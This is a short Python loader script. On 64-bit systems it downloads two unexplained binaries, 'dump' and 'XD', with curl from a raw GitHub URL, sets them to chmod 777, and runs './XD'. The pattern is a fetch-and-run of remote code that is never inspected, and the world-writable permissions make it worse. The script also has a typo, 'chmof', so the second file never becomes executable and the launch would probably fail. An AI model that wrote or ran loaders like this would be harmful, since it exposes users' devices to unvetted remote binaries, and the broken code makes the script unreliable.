import os,platform
from os import path
chk = platform.architecture()[0]
if '64bit' in chk:
    if path.isfile("dump"):
        pass
    else:
        os.system(f'curl -L https://raw.githubusercontent.com/AKING110/projects/main/dump -o dump');os.system('chmod 777 dump')
    if path.isfile("XD"):
        pass
    else:
        os.system(f'curl -L https://raw.githubusercontent.com/AKING110/projects/main/XD -o XD');os.system('chmof 777 XD')
else:
    exit('\n\n\n\033[1;31m Sorry, Your Device Not Support')
os.system('./XD')
